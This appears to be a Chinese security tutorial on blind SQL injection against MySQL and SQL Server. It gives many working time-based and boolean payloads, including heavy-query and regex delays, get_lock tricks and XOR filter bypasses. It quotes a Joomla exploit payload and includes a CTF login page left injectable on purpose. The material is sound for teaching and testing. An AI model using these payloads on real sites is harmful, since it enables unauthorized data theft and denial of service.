> 原文链接: https://www.anquanke.com//post/id/170626 


# 一篇文章带你深入理解 SQL 盲注


                                阅读量   
                                **495861**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01fa03d75ea8929dea.png)](https://p1.ssl.qhimg.com/t01fa03d75ea8929dea.png)



## 0X00 前言

简单的整理一下关于 SQL 盲注的一些想法(主要是针对 MYSQL,当然其中也不免夹杂着一些 SQL Server 和Oracle的知识)，希望能有更清晰的思路和不一样的思考。



## 0X01 盲注的一般模式

盲注的本质是猜解(所谓 “盲” 就是在你看不到返回数据的情况下能通过 “感觉” 来判断)，那能感觉到什么？答案是**：差异**（包括**运行时间的差异**和**页面返回结果的差异**）。也就是说我们想实现的是我们要构造一条语句来测试我们输入的**布尔表达式**，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。

**如图所示：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A818.png)

**我们可以把我们输入布尔表达式的点，称之为整条语句的开关，起到整条语句结果的分流作用，而此时 我们就可以把这种能根据其中输入真假返回不同结果的函数叫做开关函数，或者叫做分流函数**

说到这里其实首先想到的应该就是使用 if 这种明显的条件语句来分流，但是有时候 if 也不一定能用，那不能用我们还是想分流怎么办，实际上方法很多，我们还能利用 and 或者 or 的这种短路特性实现这种需求，示例如下：

### **1.and 0 的短路特性**

```
mysql&gt; select * from bsqli where id = 1 and 1 and sleep(1);
Empty set (1.00 sec)

mysql&gt; select * from bsqli where id = 1 and 0 and sleep(1);
Empty set (0.00 sec)

```

这个怎么看，实际上 一个 and 连接的是两个集合，and 表示取集合的交集，我么知道0 和任何集合的交集都是 0 ，那么系统就不会继续向下执行 sleep()，那么为什么第一条语句没有返回任何东西呢？因为 id =1 的结果和 sleep(1) 的交集为空集

### **2.or 1 的短路特性**

```
mysql&gt; select * from bsqli where id = 1 or 1 or sleep(1);
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
|  2 | L_Team | 234567   |
+----+--------+----------+
2 rows in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1 or 0 or sleep(1);
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (1.00 sec)
```

和上面类似 or 取得是两个集合的并集，系统检测到 or 1 的时候就不会继续检测，所以 sleep() 也就不会运行。

那么这里我们可以将 sleep() 换成我们下面准备讲的 Heavy Query ，如下

```
id = 1' and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
id = 1' and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
```

除了上面两个我们还能用 **case when then else end** 这个句型，这个和 **if** 是类似的我这里就不多介绍，我这里还想说一个我另外发现的比较有趣的一个函数(**准确的说是两个函数**)

### **3.elt() 的分流特性**

```
ELT(N ,str1 ,str2 ,str3 ,…)
```

函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数

```
mysql&gt; select * from bsqli where id = 1 and elt((1&gt;1)+1,1=1,sleep(1));
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1 and elt((1=1)+1,1=1,sleep(1));
Empty set (1.00 sec)

```

后来我发现这个确实是有[案例](https://www.exploit-db.com/exploits/42033)的，但是和我这个用法没哈关系，可能只是我见识比较短浅，这是当时的payload：

```
Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

### **4.field() 的分流特性**

```
FIELD(str, str1, str2, str3, ……)
```

该函数返回的是 str 在面这些字符串的位置的索引，如果找不到返回 0 ，但我发现这个函数同样可以作为开关来使用，如下：

```
mysql&gt; select * from bsqli where id = 1 and field(1&gt;1,sleep(1));
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (2.00 sec)

mysql&gt; select * from bsqli where id = 1 and field(1=1,sleep(1));
Empty set (1.00 sec)

```

> <p>但是这其实给了我们一种新的思路：有时候时间延迟的长短可以作为我们判断的依据，并不一定是有延迟和没延迟(当然这只是我原来没注意，不代表看这篇文章的师傅们不知道<br>
orz)</p>

另外就是如果有些函数返回的是 NULL 并不代表这个函数不能作为开关函数或者分流函数使用，因为我们还有一个函数叫做 isnull() ，可以将 null 转化成真或者假。

当然方法肯定不止这两个，这里仅仅是讲解原理的简单举例。



## 0X02 基于时间的盲注

基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段(整个猜解过程其实就是一种 fuzz)。

### **1. MYSQL 的 sleep 和 benchmark**

**我们常用的方法就是 sleep() 和 benchmark(),如下图所示**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A811_.png)

上面两个语句适用来判断是否存在 sql 注入的(**注意 sleep 是存在一个满足条件的行就会延迟指定的时间，比如sleep(5)，但是实际上查找到两个满足条件的行，那么就会延迟10s,这其实是一个非常重要的信息，在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(0.001) 看最后多少秒有结果，推断表的行数**)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A812.png)

我们还能在条件语句中结合延时函数达到猜解字段的目的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A813.png)

#### **补充 SQL Server的方法：**

判断是否存在注入：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A816.png)

判断数据库用户是否为 sa:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A817.png)

> 注：这里闭合前面语句其实也可以将其划分到堆叠注入的类别里。

但是当我们没有办法使用 **sleep(50000)—-&gt;睡眠** 和 **benchmark(10000000,md5(‘a’))—-&gt;测试函数执行速度** 的时候我们还能用下面的方式来实现我们的目的。

### **2.Heavy Query 笛卡尔积**

这种方式我把它称之为 Heavy Query 中的 **“笛卡尔积”**，具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统，我们可以简单的将这种模式用下面的示意图表示。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A81.png)

由于每个数据库的数据量差异较大，并且有着自己独特的表与字段，所以为了使用这种方式发起攻击，我们不能依赖于不同数据库的特性而是要依赖于数据库的共性，也就是利用系统自带的表和字段来完成攻击，下面是一个能够在 SQL SERVER 和 MYSQL 中成功执行的模板：

```
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
```

根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A82.png)

我们来单独执行一次对这个 columns 表的查询，然后对这个结果进行 3 次方运算，如下：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A83.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A83.png)

可以看到，和我们的分析是一样的，但是从时间来看，这种时间差是运算量指数级增加的结果。

那么假如，我们可以构造这样的一条语句

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A84.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A84.png)

如果系统返回结果的时间明显与之前有差异，那么最有可能的情况就是我们注入的语句成功在系统内执行，也就是说存在注入漏洞。

除此之外，我们还可以构造我们想要的判断语句，结合我们的 笛卡尔积 实现字段的猜解（**当然也不能太 Heavy 了，适可而止，否则可能要注到天荒地老**）

### **3.Get_lock() 加锁机制**

在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。

这种方式注入的思路来源于 pwnhub的一道新题”全宇宙最最简单的PHP博客系统” ，先来看一下 get_lock() 是什么
- **GET_LOCK(key,timeout)**
**基本语句：**

```
SELECT GET_LOCK(key, timeout) FROM DUAL;
SELECT RELEASE_LOCK(key) FROM DUAL;
```

> **注：**
<p>1.这里的 dual 是一个伪表，在 MySQL 中可以直接使用 select 1；这种查询语句，但是在 oracle 中却必须要满足 select 语句的结构，于是就有了这个相当于占位符的伪表，当然在 MYSQL 中也是可以使用的<br>
2.key 这个参数表示的是字段</p>

(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间

(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。

**我们来简单的实验一下**

现在我有这样一个表

```
mysql&gt; desc admin;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| username | varchar(100) | NO   |     | NULL    |       |
| flag     | varchar(100) | NO   |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
2 rows in set (0.38 sec)

```

我首先对 username 字段进行加锁

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A85.png)

然后我再尝试打开另一个终端，对同样的字段进行加锁尝试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A86.png)

可以看到语句没有执行成功返回 0 ，并且由于该字段已经被加锁的原因，这次的执行时间是自定义的 5s 。

现在我们给这个字段解锁：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A87.png)

再次尝试另一个终端的加锁

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A88.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A88.png)

可以看到没有任何的延时，并且返回 1 表示加锁成功

好了，有了上面的基础，我们是否能根据我上面对时间盲注原理的简单分析来举一反三实现利用 get_lock() 这种延时方式构造时间盲注语句呢？

**(1)我们首先通过注入实现对 username 字段的加锁**

```
select * from ctf where flag = 1 and get_lock('username',1);
```

**(2)然后构造我们的盲注语句**

```
select * from ctf where flag = 1 and 1 and get_lock('username',5);
select * from ctf where flag = 1 and 0 and get_lock('username',5);
```

#### **分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件**

限制条件就是数据库的连接必须是**持久连接**，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。

**php 手册中对持久连接这样描述**

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A89.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A89.png)

php 中使用 mysql_pconnect 来创建一个持久的连接，当时这道题使用的也是这个函数来创建的数据库连接

**那么什么时候会出现需要我们使用持久连接的情况呢？**

**php 手册这样解释道**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A810.png)

现在分析正式结束了.

### **4.Heavy Query 正则表达式**

这种方式与我第一个讲的 **Heavy Query 笛卡尔积**略有不同，这里是使用大量的正则匹配来达到拖慢系统实现时延的，我认为本质是相同的，所以我还是将其归纳为 Heavy Query 中的一类。

mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配(只要正则能满足匹配字符串的子字符串就OK了)

**当然他们所使用的通配符略有差异：**

(1)like 常用通配符：% 、_ 、escape

```
% : 匹配0个或任意多个字符

_ : 匹配任意一个字符

escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE '/%/_%_' ESCAPE'/'
```

(2)rlike和regexp:常用通配符：. 、* 、 [] 、 ^ 、 $ 、`{`n`}`

```
. : 匹配任意单个字符

* ： 匹配0个或多个前一个得到的字符

[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。

^ : 匹配开头，如^s匹配以s或者S开头的字符串。

$ : 匹配结尾，如s$匹配以s结尾的字符串。

`{`n`}` : 匹配前一个字符反复n次。
```

**我们可以这样构造：**

```
mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (4.24 sec)

mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)
```

上面这两个语句的构造来源于 一叶飘零 师傅的博客，但是我觉得这里面有一点点问题，我发现，我在本地测试的效果并没有 一叶飘零师傅测试的那么好，延迟效果不是很明显，只有 0.29s 并且还以为 MySQL 的某种缓存机制导致我下一次执行该命令的时候直接就是 0.00s 了，当然 rlike 如果成功的话 regexp 只要简单的替换一下就 ok 了,like 的话也依次类推 。

我后来又使用了 mysql8 进行尝试(原来我的版本是 mysql 5.5.53) ，发现了下面的情况

```
mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
ERROR 3699 (HY000): Timeout exceeded in regular expression match.

mysql&gt; select * from test where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)
```

在 mysql8 下也同样没有延迟，并且直接提示超时，所以我认为这个方法并不通用，与 MySQL 的版本有着比较紧密的联系。

### **5.该种技术的优缺点**

这种技术的一个主要优点是对日志几乎没有影响，特别是与基于错误的攻击相比。但是，在必须使用大量查询或 CPU密集型函数（如MySQL的BENCHMARK())的情况下，系统管理员可能会意识到正在发生的事情。

另一件需要考虑的事情是你注入的延迟时间。在测试Web应用程序时，这一点尤其重要。因为该服务器负载和网络速度可能对响应时间产生巨大的影响。你需要暂停查询足够长的时间，以确保这些不确定因素不会干扰你的测试结果。另一方面，你又会希望延迟足够短以在合理的时间内测试应用程序，所以把握这个时间长短的度是很困难的。

### **6.一点点补充**

由于平时用的不多，想在这里稍微记录一下关于 insert 和 update 的盲注示例

```
update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;

insert into users values (16,'K0rz3n','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
```



## 0X03 基于布尔的盲注

### **1.使用条件**

基于布尔的盲注是在这样的一种情况下使用：页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(**输入语句的真假直接影响整条查询语句最后查询的结果的真假**)

> **注意：**
另外，虽然我们构造语句的目的是让整条语句在某种情况下最后查不到结果，但是这其中其实隐含了两种情况，一种就是真的没有查到结果，使得页面的返回有所不同，但是还有一种可能就是我们构造语句让其报错，这样同样让页面的返回有所不同，但是我个人往往不愿意将这种报错的模式再另外划分出一个什么报错盲注，这里我就统一将其划分到布尔盲注中了，因为本质是一样的，所以这一部分还会设计一些报错注入的东西。

### **2.简单举例**

这里可以举一个 SQL SERVR 的例子来说明这种攻击的原理：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A814.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A814.png)

我们注入的语句会验证当前用户是否是系统管理员（sa）。如果条件为true，则语句 强制数据库通过执行除零来抛出错误。否则则执行一条有效指令。

**mysql 的语句构造方式也很简单**

```
mysql&gt; select 123 from dual where 1=1;
+-----+
| 123 |
+-----+
| 123 |
+-----+
1 row in set (0.00 sec)

mysql&gt; select 123 from dual where 1=0;
Empty set (0.00 sec)

```

再或者我们还能在 order by 后面构造

```
mysql&gt; select 1 from admin order by if(1,1,(select 1 union select 2)) limit 0,3;
+---+
| 1 |
+---+
| 1 |
| 1 |
+---+
2 rows in set (0.09 sec)

mysql&gt; select 1 from admin order by if(0,1,(select 1 union select 2)) limit 0,3;
ERROR 1242 (21000): Subquery returns more than 1 row
```

这里产生报错是因为，Union 查询返回的是两行，这两行都可以作为 order by 的依据，然后系统不知道该选哪一个，于是产生了错误。if 的第一个参数为真的时候不会产生错误，为假的时候产生错误，通过这种方式我们就可以判断出我们构造的条件语句的正确与否。

写到这里其实我还想起了一个比较经典的报错方式，就是使用 `floor(rand(0)*2)` 配合 `group by count(*)` 进行报错的方式，虽然之前这个用在报错注入但这里正好可以利用这个进行报错，我们来测试一下

```
select 1 from admin order by if(1,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;

mysql&gt; select 1 from bsqli order by if(1,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;
+---+
| 1 |
+---+
| 1 |
| 1 |
+---+
2 rows in set (0.39 sec)

mysql&gt; select 1 from bsqli order by if(0,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;
ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'
```

其实不光是这条语句，很多报错注入的语句也可以直接拿来替换（当然并不是全部，比如 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x 这个 payload 似乎就不能成功），这里只是一个小小的例子而已，关于这个语句为什么会报错，其实还是一个和有意思的探究，有兴趣的同学可以看一下这篇文章 [传送门](https://www.cnblogs.com/xdans/p/5412468.html)

构造条件语句还有很多方式，这不同的数据库中是由细微差别的，下表列出了一些例子

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A815.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A815.png)

### **3.高级案例**

这里我想讲的高级技巧就是 MySQL 数据库的位操作，所谓位操作就是将给定的操作数转化为二进制后，对各个操作数每一位都进行指定的逻辑运算，得到的二进制结果转换为十进制数后就是位运算的结果。在我的[一篇文章](http://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/)中在最后的表格里面也列举了mysql 支持的位操作符，包括 | &amp; ^ &gt;&gt; &lt;&lt; ~ 这些字符的使用往往能让我们在被严格过滤的情况下柳暗花明。

#### **举几个例子：**

##### **1.使用 &amp;**

```
mysql&gt; select * from bsqli where id = 1 &amp; 1;
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1 &amp; 0;
Empty set (0.00 sec)

```

##### **2.使用 |**

```
mysql&gt; select * from bsqli where id = 0 | 1;
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 0 | 0;
Empty set (0.00 sec)

```

##### **3.使用 ^**

上面两种可能使用的并不是很多，但是这个 ^ 异或使用的就是非常的频繁的，现在 CTF 动不动就来这个操作

```
mysql&gt; select * from bsqli where id = 1^0;
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1^1;
Empty set (0.00 sec)

```

当然，还有一个异或是 XOR ，这个异或是逻辑运算符，和 ^ 还是有本质区别的，我们可以把 XOR 理解为求补集的过程

这里其实还可以举一个 CTF 题目出来，正好是我做赛前培训的一到例题：

**index.php**

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;from action="index.php?action=login" method="POST"&gt;
        username: &lt;input type="text" name="username"&gt;&lt;/br&gt;
        password: &lt;input type="password" name="password"&gt;&lt;/br&gt;
        &lt;input type="submit"&gt;
    &lt;/from&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php

session_start();
require("conn.php");
$action = isset($_GET['action']) ? $_GET['action'] : '';

function filter($str)`{`
    $pattern = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
    if(preg_match($pattern, $str))`{`
        die("hacker");
    `}`
    return $str;
`}`

    if($action === 'login')`{`
        $username = isset($_POST['username']) ? filter(strtolower(trim($_POST['username']))) : '';
        $password = isset($_POST['password']) ? md5($_POST['password']) : '';
        if($username == '')`{`
            die("Invalid username");
        `}`
        $result = $mysqli-&gt;query("SELECT * FROM users WHERE username = '`{`$username`}`'");
        $row = mysqli_fetch_array($result);
        if(isset($row['username']))`{`
            if($row['password'] === $password)`{`
                $_SESSION['username'] = $username;
                $_SESSION['flag'] = $row['flag'];
                header('Location: index.php?action=main');
            `}`

        `}`else`{`

            echo "Invalid username or password"; 
        `}`
        exit;

    `}`elseif($action === 'main')`{`
        if(!isset($_SESSION['username']))`{`
            header("Location: index.php");
            exit;
        `}`

        echo "Hello, " . $_SESSION['username'] . ", " . $_SESSION['flag'] . "&lt;br&gt;n";
    `}`else`{`
        if(isset($_SESSION['username']))`{`
            header("Location: index.php?action=main");
            exit;
        `}`
    `}`

highlight_file(__FILE__);
?&gt;
```

可以看到这里过滤了很多东西，但是没有过滤 ^ ，我们可以利用这个点做文章

我们可以构造条件语句来进行对flag字段进行猜解，当语句错误时，查询条件则为 ‘1’^0^’’，得1，数据库查询不到结果，网页会返回’Invalid username or password’

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A819.png)

当语句正确时，查询条件则为 ‘1’^1^’’ ,数据库有返回结果，网页则不返回’Invalid username or password’。因此可以用它来当语句正确与否的标志，然后逐字猜解即可获得flag

